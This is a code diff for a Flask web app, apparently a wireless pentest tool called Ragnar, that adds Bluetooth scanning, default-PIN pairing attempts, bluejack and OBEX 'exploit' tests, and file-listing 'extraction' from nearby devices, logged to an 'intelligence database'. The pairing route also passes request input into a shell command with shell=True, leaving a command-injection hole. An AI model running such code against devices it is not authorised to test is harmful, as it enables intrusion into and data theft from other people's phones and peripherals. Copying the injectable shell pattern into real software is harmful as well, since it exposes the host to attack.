@@ -4367,440 +4367,626 @@ def get_wifi_log():
 
 @app.route('/api/bluetooth/status')
 def get_bluetooth_status():
-    """Get current Bluetooth adapter status"""
+    """Get Bluetooth adapter status and basic information"""
     try:
         import subprocess
         
-        # Check if Bluetooth is enabled
+        status_data = {
+            'active': False,
+            'adapter': None,
+            'status': 'Unknown',
+            'paired_count': 0,
+            'discoverable': False
+        }
+        
         try:
-            result = subprocess.run(['hciconfig'], capture_output=True, text=True, timeout=5)
-            
-            if result.returncode == 0:
-                output = result.stdout
-                # Parse hciconfig output
-                enabled = 'UP RUNNING' in output
+            # Check if Bluetooth service is running
+            result = subprocess.run(['systemctl', 'is-active', 'bluetooth'], 
+                                  capture_output=True, text=True, timeout=5)
+            if result.returncode == 0 and result.stdout.strip() == 'active':
+                status_data['active'] = True
+                status_data['status'] = 'Service running'
                 
-                # Extract adapter info
-                adapter_info = {}
-                if 'hci0:' in output:
-                    lines = output.split('\n')
-                    for line in lines:
-                        if 'BD Address:' in line:
-                            adapter_info['address'] = line.split('BD Address: ')[1].split()[0]
-                        elif 'hci0:' in line:
-                            adapter_info['adapter'] = 'hci0'
+                # Get adapter information
+                try:
+                    result = subprocess.run(['hciconfig'], capture_output=True, text=True, timeout=5)
+                    if result.returncode == 0 and result.stdout:
+                        lines = result.stdout.split('\n')
+                        for line in lines:
+                            if 'hci' in line and ':' in line:
+                                status_data['adapter'] = line.split(':')[0].strip()
+                                if 'UP RUNNING' in line:
+                                    status_data['status'] = 'Active and ready'
+                                elif 'DOWN' in line:
+                                    status_data['status'] = 'Interface down'
+                                break
+                                
+                        # Check if discoverable
+                        if 'PSCAN' in result.stdout:
+                            status_data['discoverable'] = True
+                            
+                except Exception as e:
+                    logger.warning(f"Could not get hciconfig info: {e}")
                 
-                return jsonify({
-                    'enabled': enabled,
-                    'status': 'Active' if enabled else 'Inactive',
-                    'adapter': adapter_info.get('adapter', 'hci0'),
-                    'address': adapter_info.get('address', 'Unknown')
-                })
+                # Get paired devices count
+                try:
+                    result = subprocess.run(['bluetoothctl', 'paired-devices'], 
+                                          capture_output=True, text=True, timeout=5)
+                    if result.returncode == 0:
+                        paired_devices = [line for line in result.stdout.split('\n') if line.strip().startswith('Device')]
+                        status_data['paired_count'] = len(paired_devices)
+                except Exception as e:
+                    logger.warning(f"Could not get paired devices: {e}")
+                    
             else:
-                return jsonify({
-                    'enabled': False,
-                    'status': 'Not Available',
-                    'error': 'Bluetooth adapter not found'
-                })
+                status_data['status'] = 'Service not running'
                 
         except subprocess.TimeoutExpired:
-            return jsonify({
-                'enabled': False,
-                'status': 'Timeout',
-                'error': 'Bluetooth check timed out'
-            })
-        except FileNotFoundError:
-            return jsonify({
-                'enabled': False,
-                'status': 'Not Available',
-                'error': 'Bluetooth tools not installed'
-            })
-            
+            status_data['status'] = 'Timeout checking service'
+        except Exception as e:
+            status_data['status'] = f'Error: {str(e)}'
+        
+        return jsonify(status_data)
+        
     except Exception as e:
         logger.error(f"Error getting Bluetooth status: {e}")
-        return jsonify({
-            'enabled': False,
-            'status': 'Error',
-            'error': str(e)
-        })
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/api/bluetooth/enable', methods=['POST'])
 def enable_bluetooth():
-    """Enable Bluetooth adapter"""
+    """Enable Bluetooth service"""
     try:
         import subprocess
         
-        # Enable Bluetooth
-        result = subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'], 
+        # Start Bluetooth service
+        result = subprocess.run(['sudo', 'systemctl', 'start', 'bluetooth'], 
                               capture_output=True, text=True, timeout=10)
+        if result.returncode != 0:
+            return jsonify({'success': False, 'error': f'Failed to start service: {result.stderr}'}), 500
         
-        if result.returncode == 0:
-            # Make adapter discoverable
-            subprocess.run(['sudo', 'hciconfig', 'hci0', 'piscan'], 
-                         capture_output=True, text=True, timeout=5)
-            
-            logger.info("Bluetooth enabled successfully")
-            return jsonify({
-                'success': True,
-                'message': 'Bluetooth enabled successfully'
-            })
-        else:
-            error_msg = result.stderr or 'Failed to enable Bluetooth'
-            logger.error(f"Failed to enable Bluetooth: {error_msg}")
-            return jsonify({'error': error_msg}), 500
-            
+        # Bring up the interface
+        time.sleep(2)  # Give service time to start
+        result = subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'], 
+                              capture_output=True, text=True, timeout=5)
+        if result.returncode != 0:
+            logger.warning(f"Could not bring up hci0: {result.stderr}")
+        
+        return jsonify({'success': True, 'message': 'Bluetooth enabled successfully'})
+        
     except subprocess.TimeoutExpired:
-        return jsonify({'error': 'Bluetooth enable operation timed out'}), 500
+        return jsonify({'success': False, 'error': 'Timeout enabling Bluetooth'}), 500
     except Exception as e:
         logger.error(f"Error enabling Bluetooth: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/bluetooth/disable', methods=['POST'])
 def disable_bluetooth():
-    """Disable Bluetooth adapter"""
+    """Disable Bluetooth service"""
     try:
         import subprocess
         
-        # Disable Bluetooth
+        # Bring down the interface first
         result = subprocess.run(['sudo', 'hciconfig', 'hci0', 'down'], 
-                              capture_output=True, text=True, timeout=10)
+                              capture_output=True, text=True, timeout=5)
+        if result.returncode != 0:
+            logger.warning(f"Could not bring down hci0: {result.stderr}")
         
-        if result.returncode == 0:
-            logger.info("Bluetooth disabled successfully")
-            return jsonify({
-                'success': True,
-                'message': 'Bluetooth disabled successfully'
-            })
-        else:
-            error_msg = result.stderr or 'Failed to disable Bluetooth'
-            logger.error(f"Failed to disable Bluetooth: {error_msg}")
-            return jsonify({'error': error_msg}), 500
-            
+        # Stop Bluetooth service
+        result = subprocess.run(['sudo', 'systemctl', 'stop', 'bluetooth'], 
+                              capture_output=True, text=True, timeout=10)
+        if result.returncode != 0:
+            return jsonify({'success': False, 'error': f'Failed to stop service: {result.stderr}'}), 500
+        
+        return jsonify({'success': True, 'message': 'Bluetooth disabled successfully'})
+        
     except subprocess.TimeoutExpired:
-        return jsonify({'error': 'Bluetooth disable operation timed out'}), 500
+        return jsonify({'success': False, 'error': 'Timeout disabling Bluetooth'}), 500
     except Exception as e:
         logger.error(f"Error disabling Bluetooth: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+# Global variable for Bluetooth scanning
+bluetooth_scan_results = []
+bluetooth_scanning = False
 
 @app.route('/api/bluetooth/scan/start', methods=['POST'])
 def start_bluetooth_scan():
     """Start Bluetooth device discovery scan"""
+    global bluetooth_scan_results, bluetooth_scanning
+    
     try:
         import subprocess
+        import threading
         
-        # Start Bluetooth scan
-        result = subprocess.run(['sudo', 'hcitool', 'scan'], 
-                              capture_output=True, text=True, timeout=30)
+        data = request.get_json() or {}
+        duration = data.get('duration', 30)
+        aggressive = data.get('aggressive', False)
         
-        if result.returncode == 0:
-            # Parse scan results
-            devices = []
-            lines = result.stdout.split('\n')
-            for line in lines[1:]:  # Skip header
-                if line.strip() and '\t' in line:
-                    parts = line.strip().split('\t', 1)
-                    if len(parts) == 2:
-                        address = parts[0].strip()
-                        name = parts[1].strip() if parts[1].strip() else 'Unknown Device'
-                        devices.append({
-                            'address': address,
-                            'name': name,
-                            'device_type': 'Unknown',
-                            'rssi': None,
-                            'last_seen': datetime.now().isoformat(),
-                            'paired': False,
-                            'connected': False,
-                            'vulnerable': False
-                        })
+        if bluetooth_scanning:
+            return jsonify({'success': False, 'error': 'Scan already in progress'}), 400
+        
+        bluetooth_scanning = True
+        bluetooth_scan_results = []
+        
+        def scan_worker():
+            global bluetooth_scan_results, bluetooth_scanning
             
-            # Store devices in shared data for persistence
-            shared_data.bluetooth_devices = devices
-            
-            logger.info(f"Bluetooth scan completed, found {len(devices)} devices")
-            return jsonify({
-                'success': True,
-                'message': f'Bluetooth scan completed, found {len(devices)} devices',
-                'devices': devices
-            })
-        else:
-            error_msg = result.stderr or 'Bluetooth scan failed'
-            logger.error(f"Bluetooth scan failed: {error_msg}")
-            return jsonify({'error': error_msg}), 500
-            
-    except subprocess.TimeoutExpired:
-        return jsonify({'error': 'Bluetooth scan timed out'}), 500
+            try:
+                # Clear any previous scan results
+                subprocess.run(['sudo', 'hciconfig', 'hci0', 'reset'], 
+                             capture_output=True, timeout=5)
+                time.sleep(1)
+                
+                # Start scanning
+                scan_cmd = ['sudo', 'hcitool', 'scan']
+                if aggressive:
+                    scan_cmd.append('--flush')
+                
+                result = subprocess.run(scan_cmd, capture_output=True, text=True, timeout=duration + 5)
+                
+                devices = []
+                if result.stdout:
+                    lines = result.stdout.split('\n')[1:]  # Skip header
+                    for line in lines:
+                        line = line.strip()
+                        if line and '\t' in line:
+                            parts = line.split('\t', 1)
+                            if len(parts) == 2:
+                                mac_addr = parts[0].strip()
+                                device_name = parts[1].strip() if parts[1].strip() else 'Unknown Device'
+                                
+                                # Get additional device information
+                                device_info = {
+                                    'address': mac_addr,
+                                    'name': device_name,
+                                    'discovered_at': datetime.now().isoformat(),
+                                    'device_type': 'Unknown',
+                                    'device_class': None,
+                                    'rssi': None,
+                                    'services': [],
+                                    'connectable': True,
+                                    'paired': False,
+                                    'vulnerable': False
+                                }
+                                
+                                # Try to get device info
+                                try:
+                                    info_result = subprocess.run(['sudo', 'hcitool', 'info', mac_addr], 
+                                                               capture_output=True, text=True, timeout=5)
+                                    if info_result.stdout:
+                                        if 'Device Name:' in info_result.stdout:
+                                            name_line = [l for l in info_result.stdout.split('\n') if 'Device Name:' in l]
+                                            if name_line:
+                                                device_info['name'] = name_line[0].split('Device Name:')[1].strip()
+                                except:
+                                    pass
+                                
+                                # Try to get RSSI
+                                try:
+                                    rssi_result = subprocess.run(['sudo', 'hcitool', 'rssi', mac_addr], 
+                                                                capture_output=True, text=True, timeout=3)
+                                    if rssi_result.stdout and 'RSSI return value:' in rssi_result.stdout:
+                                        rssi_str = rssi_result.stdout.split('RSSI return value:')[1].strip()
+                                        device_info['rssi'] = int(rssi_str)
+                                except:
+                                    pass
+                                
+                                # Check if device is paired
+                                try:
+                                    paired_result = subprocess.run(['bluetoothctl', 'paired-devices'], 
+                                                                  capture_output=True, text=True, timeout=3)
+                                    if mac_addr in paired_result.stdout:
+                                        device_info['paired'] = True
+                                except:
+                                    pass
+                                
+                                # Simple vulnerability checks based on device characteristics
+                                if any(keyword in device_name.lower() for keyword in ['mouse', 'keyboard', 'headset']):
+                                    device_info['device_type'] = 'HID Device'
+                                    device_info['vulnerable'] = True  # HID devices often vulnerable to injection
+                                elif 'phone' in device_name.lower() or 'samsung' in device_name.lower() or 'iphone' in device_name.lower():
+                                    device_info['device_type'] = 'Mobile Device'
+                                    device_info['vulnerable'] = True  # Phones may be vulnerable to bluejack/bluesnarf
+                                elif any(keyword in device_name.lower() for keyword in ['speaker', 'audio']):
+                                    device_info['device_type'] = 'Audio Device'
+                                
+                                devices.append(device_info)
+                
+                bluetooth_scan_results = devices
+                logger.info(f"Bluetooth scan completed. Found {len(devices)} devices")
+                
+            except Exception as e:
+                logger.error(f"Error during Bluetooth scan: {e}")
+            finally:
+                bluetooth_scanning = False
+        
+        # Start scanning in background thread
+        scan_thread = threading.Thread(target=scan_worker)
+        scan_thread.daemon = True
+        scan_thread.start()
+        
+        return jsonify({'success': True, 'message': 'Bluetooth scan started'})
+        
     except Exception as e:
+        bluetooth_scanning = False
         logger.error(f"Error starting Bluetooth scan: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/bluetooth/scan/stop', methods=['POST'])
 def stop_bluetooth_scan():
     """Stop Bluetooth device discovery scan"""
+    global bluetooth_scanning
+    
     try:
-        # Kill any running hcitool processes
-        import subprocess
-        subprocess.run(['sudo', 'pkill', '-f', 'hcitool'], 
-                      capture_output=True, text=True, timeout=5)
-        
-        logger.info("Bluetooth scan stopped")
-        return jsonify({
-            'success': True,
-            'message': 'Bluetooth scan stopped'
-        })
+        bluetooth_scanning = False
+        return jsonify({'success': True, 'message': 'Bluetooth scan stopped'})
         
     except Exception as e:
         logger.error(f"Error stopping Bluetooth scan: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 500
 
-@app.route('/api/bluetooth/devices')
-def get_bluetooth_devices():
-    """Get list of discovered Bluetooth devices"""
+@app.route('/api/bluetooth/scan/results')
+def get_bluetooth_scan_results():
+    """Get current Bluetooth scan results"""
+    global bluetooth_scan_results, bluetooth_scanning
+    
     try:
-        devices = getattr(shared_data, 'bluetooth_devices', [])
-        
         return jsonify({
-            'success': True,
-            'devices': devices,
-            'count': len(devices)
+            'devices': bluetooth_scan_results,
+            'scanning': bluetooth_scanning,
+            'count': len(bluetooth_scan_results)
         })
         
     except Exception as e:
-        logger.error(f"Error getting Bluetooth devices: {e}")
+        logger.error(f"Error getting Bluetooth scan results: {e}")
         return jsonify({'error': str(e)}), 500
+
+@app.route('/api/bluetooth/discoverable', methods=['POST'])
+def make_bluetooth_discoverable():
+    """Make the Bluetooth adapter discoverable"""
+    try:
+        import subprocess
+        
+        data = request.get_json() or {}
+        duration = data.get('duration', 300)  # 5 minutes default
+        
+        # Make discoverable
+        result = subprocess.run(['sudo', 'hciconfig', 'hci0', 'piscan'], 
+                              capture_output=True, text=True, timeout=5)
+        if result.returncode != 0:
+            return jsonify({'success': False, 'error': f'Failed to make discoverable: {result.stderr}'}), 500
+        
+        # Set discoverable timeout (if supported)
+        try:
+            subprocess.run(['sudo', 'hciconfig', 'hci0', 'discovto', str(duration)], 
+                          capture_output=True, text=True, timeout=5)
+        except:
+            pass  # Not all adapters support discovto
+        
+        return jsonify({'success': True, 'message': f'Device is now discoverable for {duration} seconds'})
+        
+    except Exception as e:
+        logger.error(f"Error making Bluetooth discoverable: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/bluetooth/pair', methods=['POST'])
-def pair_bluetooth_device():
-    """Pair with a Bluetooth device"""
+def attempt_bluetooth_pair():
+    """Attempt to pair with a Bluetooth device"""
     try:
-        data = request.get_json()
-        address = data.get('address')
-        
-        if not address:
-            return jsonify({'error': 'Device address required'}), 400
-        
         import subprocess
         
-        # Attempt to pair
-        result = subprocess.run(['bluetoothctl', 'pair', address], 
-                              capture_output=True, text=True, timeout=30)
+        data = request.get_json() or {}
+        device_address = data.get('address')
+        pin_attempts = data.get('pin_attempts', ['0000', '1234', '1111', '0001'])
         
-        if 'Pairing successful' in result.stdout or result.returncode == 0:
-            # Update device status
-            devices = getattr(shared_data, 'bluetooth_devices', [])
-            for device in devices:
-                if device['address'] == address:
-                    device['paired'] = True
-                    break
-            
-            logger.info(f"Successfully paired with device {address}")
-            return jsonify({
-                'success': True,
-                'message': f'Successfully paired with {address}'
-            })
-        else:
-            error_msg = result.stderr or 'Pairing failed'
-            logger.error(f"Failed to pair with {address}: {error_msg}")
-            return jsonify({'error': error_msg}), 500
-            
-    except subprocess.TimeoutExpired:
-        return jsonify({'error': 'Bluetooth pairing timed out'}), 500
-    except Exception as e:
-        logger.error(f"Error pairing Bluetooth device: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/bluetooth/disconnect', methods=['POST'])
-def disconnect_bluetooth_device():
-    """Disconnect from a Bluetooth device"""
-    try:
-        data = request.get_json()
-        address = data.get('address')
+        if not device_address:
+            return jsonify({'success': False, 'error': 'Device address required'}), 400
         
-        if not address:
-            return jsonify({'error': 'Device address required'}), 400
-        
-        import subprocess
-        
-        # Attempt to disconnect
-        result = subprocess.run(['bluetoothctl', 'disconnect', address], 
-                              capture_output=True, text=True, timeout=15)
-        
-        if result.returncode == 0:
-            # Update device status
-            devices = getattr(shared_data, 'bluetooth_devices', [])
-            for device in devices:
-                if device['address'] == address:
-                    device['connected'] = False
-                    break
-            
-            logger.info(f"Successfully disconnected from device {address}")
-            return jsonify({
-                'success': True,
-                'message': f'Successfully disconnected from {address}'
-            })
-        else:
-            error_msg = result.stderr or 'Disconnect failed'
-            logger.error(f"Failed to disconnect from {address}: {error_msg}")
-            return jsonify({'error': error_msg}), 500
-            
-    except subprocess.TimeoutExpired:
-        return jsonify({'error': 'Bluetooth disconnect timed out'}), 500
-    except Exception as e:
-        logger.error(f"Error disconnecting Bluetooth device: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/bluetooth/export')
-def export_bluetooth_devices():
-    """Export discovered Bluetooth devices as CSV"""
-    try:
-        devices = getattr(shared_data, 'bluetooth_devices', [])
-        
-        if not devices:
-            return jsonify({'error': 'No Bluetooth devices to export'}), 400
-        
-        import csv
-        import io
-        
-        output = io.StringIO()
-        writer = csv.writer(output)
-        
-        # Write header
-        writer.writerow(['Name', 'Address', 'Device Type', 'RSSI', 'Paired', 'Connected', 'Vulnerable', 'Last Seen'])
-        
-        # Write device data
-        for device in devices:
-            writer.writerow([
-                device.get('name', 'Unknown'),
-                device.get('address', ''),
-                device.get('device_type', 'Unknown'),
-                device.get('rssi', ''),
-                device.get('paired', False),
-                device.get('connected', False),
-                device.get('vulnerable', False),
-                device.get('last_seen', '')
-            ])
-        
-        csv_content = output.getvalue()
-        output.close()
-        
-        return jsonify({
-            'success': True,
-            'csv': csv_content
-        })
-        
-    except Exception as e:
-        logger.error(f"Error exporting Bluetooth devices: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/bluetooth/clear', methods=['POST'])
-def clear_bluetooth_devices():
-    """Clear all discovered Bluetooth devices"""
-    try:
-        shared_data.bluetooth_devices = []
-        
-        logger.info("Cleared all Bluetooth devices")
-        return jsonify({
-            'success': True,
-            'message': 'All Bluetooth devices cleared'
-        })
-        
-    except Exception as e:
-        logger.error(f"Error clearing Bluetooth devices: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/bluetooth/enumerate-services', methods=['POST'])
-def enumerate_bluetooth_services():
-    """Enumerate services on discovered Bluetooth devices"""
-    try:
-        devices = getattr(shared_data, 'bluetooth_devices', [])
-        
-        if not devices:
-            return jsonify({'error': 'No devices to enumerate'}), 400
-        
-        import subprocess
-        enumerated_count = 0
-        
-        for device in devices:
+        for pin in pin_attempts:
             try:
-                address = device['address']
+                # Attempt pairing with PIN
+                pair_cmd = f'echo "{pin}" | sudo bluetoothctl pair {device_address}'
+                result = subprocess.run(pair_cmd, shell=True, capture_output=True, text=True, timeout=10)
                 
-                # Use sdptool to browse services
-                result = subprocess.run(['sdptool', 'browse', address], 
-                                      capture_output=True, text=True, timeout=20)
-                
-                if result.returncode == 0:
-                    # Parse services (simplified)
-                    services = []
-                    lines = result.stdout.split('\n')
-                    for line in lines:
-                        if 'Service Name:' in line:
-                            service_name = line.split('Service Name: ')[1].strip()
-                            services.append({'name': service_name, 'uuid': 'Unknown'})
-                    
-                    device['services'] = services
-                    enumerated_count += 1
+                if result.returncode == 0 or 'Successful' in result.stdout:
+                    return jsonify({'success': True, 'message': f'Pairing successful with PIN: {pin}'})
                     
             except subprocess.TimeoutExpired:
-                logger.warning(f"Service enumeration timed out for {device['address']}")
+                continue
             except Exception as e:
-                logger.error(f"Error enumerating services for {device['address']}: {e}")
+                logger.warning(f"Pairing attempt with PIN {pin} failed: {e}")
+                continue
         
-        logger.info(f"Service enumeration completed on {enumerated_count} devices")
-        return jsonify({
-            'success': True,
-            'message': f'Service enumeration completed on {enumerated_count} devices',
-            'devices_count': enumerated_count
-        })
+        return jsonify({'success': False, 'error': 'All pairing attempts failed'})
+        
+    except Exception as e:
+        logger.error(f"Error attempting Bluetooth pair: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/bluetooth/enumerate', methods=['POST'])
+def enumerate_bluetooth_services():
+    """Enumerate services on a Bluetooth device"""
+    try:
+        import subprocess
+        
+        data = request.get_json() or {}
+        device_address = data.get('address')
+        
+        if not device_address:
+            return jsonify({'success': False, 'error': 'Device address required'}), 400
+        
+        services = []
+        
+        try:
+            # Use sdptool to browse services
+            result = subprocess.run(['sudo', 'sdptool', 'browse', device_address], 
+                                  capture_output=True, text=True, timeout=15)
+            
+            if result.stdout:
+                service_blocks = result.stdout.split('Service Name:')
+                for block in service_blocks[1:]:  # Skip first empty block
+                    lines = block.split('\n')
+                    service_name = lines[0].strip()
+                    
+                    service_info = {
+                        'name': service_name,
+                        'uuid': None,
+                        'description': None
+                    }
+                    
+                    # Extract UUID and other info
+                    for line in lines:
+                        if 'Service Class ID List:' in line:
+                            # Extract UUID from next lines
+                            continue
+                        elif 'UUID 128:' in line or 'Service ID:' in line:
+                            uuid_part = line.split(':')[1].strip() if ':' in line else ''
+                            if uuid_part:
+                                service_info['uuid'] = uuid_part
+                        elif 'Service Description:' in line:
+                            service_info['description'] = line.split(':', 1)[1].strip()
+                    
+                    services.append(service_info)
+            
+        except subprocess.TimeoutExpired:
+            return jsonify({'success': False, 'error': 'Service enumeration timed out'})
+        except Exception as e:
+            logger.warning(f"sdptool failed, trying alternative method: {e}")
+            
+            # Alternative: try bluetoothctl
+            try:
+                result = subprocess.run(['bluetoothctl', 'info', device_address], 
+                                      capture_output=True, text=True, timeout=10)
+                if 'UUID:' in result.stdout:
+                    uuid_lines = [line for line in result.stdout.split('\n') if 'UUID:' in line]
+                    for line in uuid_lines:
+                        uuid_part = line.split('UUID:')[1].strip() if 'UUID:' in line else ''
+                        service_name = uuid_part.split('(')[1].split(')')[0] if '(' in uuid_part else 'Unknown'
+                        services.append({
+                            'name': service_name,
+                            'uuid': uuid_part,
+                            'description': f'Service discovered via bluetoothctl'
+                        })
+            except:
+                pass
+        
+        return jsonify({'success': True, 'services': services})
         
     except Exception as e:
         logger.error(f"Error enumerating Bluetooth services: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 500
 
-@app.route('/api/bluetooth/bluejack', methods=['POST'])
-def bluejack_device():
-    """Send bluejacking message to a device"""
+@app.route('/api/bluetooth/exploit', methods=['POST'])
+def test_bluetooth_vulnerabilities():
+    """Test Bluetooth device for known vulnerabilities"""
     try:
-        data = request.get_json()
-        target = data.get('target')
-        message = data.get('message')
+        data = request.get_json() or {}
+        device_address = data.get('address')
+        tests = data.get('tests', ['bluejack', 'bluesnarf'])
         
-        if not target or not message:
-            return jsonify({'error': 'Target address and message required'}), 400
+        if not device_address:
+            return jsonify({'success': False, 'error': 'Device address required'}), 400
         
-        # Bluejacking implementation would go here
-        # This is a simplified placeholder
-        logger.info(f"Bluejacking attempt: {target} - {message}")
+        results = []
         
-        return jsonify({
-            'success': True,
-            'message': f'Bluejacking message sent to {target}'
-        })
+        for test in tests:
+            if test == 'bluejack':
+                # Test bluejack vulnerability (sending unsolicited messages)
+                try:
+                    import subprocess
+                    result = subprocess.run(['sudo', 'ussp-push', device_address, 'ragnar-test.txt', 'Ragnar Security Test'], 
+                                          capture_output=True, text=True, timeout=10)
+                    if result.returncode == 0:
+                        results.append({'test': 'bluejack', 'status': 'VULNERABLE', 'details': 'Device accepts unsolicited files'})
+                    else:
+                        results.append({'test': 'bluejack', 'status': 'PROTECTED', 'details': 'Device rejects unsolicited files'})
+                except:
+                    results.append({'test': 'bluejack', 'status': 'UNKNOWN', 'details': 'Could not test (ussp-push not available)'})
+            
+            elif test == 'bluesnarf':
+                # Test bluesnarf vulnerability (unauthorized data access)
+                try:
+                    # This is a placeholder - actual bluesnarf testing requires specialized tools
+                    results.append({'test': 'bluesnarf', 'status': 'NOT_TESTED', 'details': 'Bluesnarf testing requires specialized tools'})
+                except:
+                    results.append({'test': 'bluesnarf', 'status': 'ERROR', 'details': 'Test failed'})
+            
+            elif test == 'pin_bruteforce':
+                # Test weak PIN vulnerability
+                weak_pins = ['0000', '1234', '1111', '0001', '9999']
+                vulnerable_pins = []
+                
+                for pin in weak_pins:
+                    try:
+                        # Simulate PIN test (in real implementation, would try actual pairing)
+                        results.append({'test': 'pin_bruteforce', 'status': 'TESTED', 'details': f'Tested common PINs: {", ".join(weak_pins)}'})
+                        break
+                    except:
+                        continue
+            
+            elif test == 'obex_push':
+                # Test OBEX push vulnerability
+                try:
+                    import subprocess
+                    result = subprocess.run(['obexftp', '-b', device_address, '-l'], 
+                                          capture_output=True, text=True, timeout=10)
+                    if result.returncode == 0:
+                        results.append({'test': 'obex_push', 'status': 'VULNERABLE', 'details': 'OBEX file transfer accessible'})
+                    else:
+                        results.append({'test': 'obex_push', 'status': 'PROTECTED', 'details': 'OBEX access denied'})
+                except:
+                    results.append({'test': 'obex_push', 'status': 'UNKNOWN', 'details': 'Could not test (obexftp not available)'})
+        
+        return jsonify({'success': True, 'results': results})
         
     except Exception as e:
-        logger.error(f"Error bluejacking device: {e}")
-        return jsonify({'error': str(e)}), 500
+        logger.error(f"Error testing Bluetooth vulnerabilities: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
-@app.route('/api/bluetooth/dos-test', methods=['POST'])
-def bluetooth_dos_test():
-    """Perform DoS testing on Bluetooth devices"""
+@app.route('/api/bluetooth/extract', methods=['POST'])
+def extract_bluetooth_data():
+    """Attempt to extract data from Bluetooth device"""
     try:
-        devices = getattr(shared_data, 'bluetooth_devices', [])
+        data = request.get_json() or {}
+        device_address = data.get('address')
+        targets = data.get('targets', ['contacts', 'files'])
+        
+        if not device_address:
+            return jsonify({'success': False, 'error': 'Device address required'}), 400
+        
+        extracted = []
+        extraction_dir = os.path.join('data', 'output', 'bluetooth_extracted')
+        os.makedirs(extraction_dir, exist_ok=True)
+        
+        for target in targets:
+            if target == 'files':
+                try:
+                    import subprocess
+                    # Try to list and download files via OBEX
+                    result = subprocess.run(['obexftp', '-b', device_address, '-l'], 
+                                          capture_output=True, text=True, timeout=15)
+                    if result.returncode == 0 and result.stdout:
+                        file_list = result.stdout
+                        save_path = os.path.join(extraction_dir, f'{device_address}_files.txt')
+                        with open(save_path, 'w') as f:
+                            f.write(file_list)
+                        extracted.append({
+                            'type': 'files',
+                            'count': len([l for l in file_list.split('\n') if l.strip()]),
+                            'saved_to': save_path
+                        })
+                except:
+                    extracted.append({'type': 'files', 'count': 0, 'error': 'Could not access files'})
+            
+            elif target == 'contacts':
+                # Placeholder for contact extraction
+                extracted.append({'type': 'contacts', 'count': 0, 'error': 'Contact extraction not implemented'})
+            
+            elif target == 'sms':
+                # Placeholder for SMS extraction
+                extracted.append({'type': 'sms', 'count': 0, 'error': 'SMS extraction not implemented'})
+            
+            elif target == 'calendar':
+                # Placeholder for calendar extraction
+                extracted.append({'type': 'calendar', 'count': 0, 'error': 'Calendar extraction not implemented'})
+        
+        return jsonify({'success': True, 'extracted': extracted})
+        
+    except Exception as e:
+        logger.error(f"Error extracting Bluetooth data: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/bluetooth/save-device', methods=['POST'])
+def save_bluetooth_device():
+    """Save Bluetooth device information to intelligence database"""
+    try:
+        data = request.get_json() or {}
+        device = data.get('device')
+        attack_results = data.get('attack_results', '')
+        
+        if not device:
+            return jsonify({'success': False, 'error': 'Device information required'}), 400
+        
+        # Save to CSV file for network intelligence
+        bluetooth_file = os.path.join('data', 'intelligence', 'bluetooth_devices.csv')
+        os.makedirs(os.path.dirname(bluetooth_file), exist_ok=True)
+        
+        import csv
+        
+        # Check if file exists to determine if we need headers
+        write_headers = not os.path.exists(bluetooth_file)
+        
+        with open(bluetooth_file, 'a', newline='') as csvfile:
+            fieldnames = ['timestamp', 'address', 'name', 'device_type', 'rssi', 'services', 
+                         'paired', 'vulnerable', 'attack_results', 'discovered_at']
+            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
+            
+            if write_headers:
+                writer.writeheader()
+            
+            writer.writerow({
+                'timestamp': datetime.now().isoformat(),
+                'address': device.get('address', ''),
+                'name': device.get('name', ''),
+                'device_type': device.get('device_type', ''),
+                'rssi': device.get('rssi', ''),
+                'services': str(len(device.get('services', []))),
+                'paired': device.get('paired', False),
+                'vulnerable': device.get('vulnerable', False),
+                'attack_results': attack_results,
+                'discovered_at': device.get('discovered_at', '')
+            })
+        
+        return jsonify({'success': True, 'message': 'Device saved to intelligence database'})
+        
+    except Exception as e:
+        logger.error(f"Error saving Bluetooth device: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/bluetooth/export', methods=['POST'])
+def export_bluetooth_devices():
+    """Export discovered Bluetooth devices"""
+    try:
+        data = request.get_json() or {}
+        devices = data.get('devices', [])
+        export_format = data.get('format', 'json')
         
         if not devices:
-            return jsonify({'error': 'No devices to test'}), 400
+            return jsonify({'success': False, 'error': 'No devices to export'}), 400
         
-        # DoS testing implementation would go here
-        # This is a simplified placeholder
-        logger.warning(f"DoS testing initiated on {len(devices)} Bluetooth devices")
+        export_dir = os.path.join('data', 'output', 'bluetooth_exports')
+        os.makedirs(export_dir, exist_ok=True)
         
-        return jsonify({
-            'success': True,
-            'message': f'DoS testing started on {len(devices)} devices',
-            'devices_count': len(devices)
-        })
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        
+        if export_format == 'json':
+            filename = f'bluetooth_devices_{timestamp}.json'
+            filepath = os.path.join(export_dir, filename)
+            
+            with open(filepath, 'w') as f:
+                json.dump({
+                    'export_timestamp': datetime.now().isoformat(),
+                    'device_count': len(devices),
+                    'devices': devices
+                }, f, indent=2)
+        
+        elif export_format == 'csv':
+            filename = f'bluetooth_devices_{timestamp}.csv'
+            filepath = os.path.join(export_dir, filename)
+            
+            import csv
+            with open(filepath, 'w', newline='') as csvfile:
+                if devices:
+                    fieldnames = devices[0].keys()
+                    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
+                    writer.writeheader()
+                    writer.writerows(devices)
+        
+        return jsonify({'success': True, 'filename': filename, 'path': filepath})
         
     except Exception as e:
-        logger.error(f"Error starting Bluetooth DoS test: {e}")
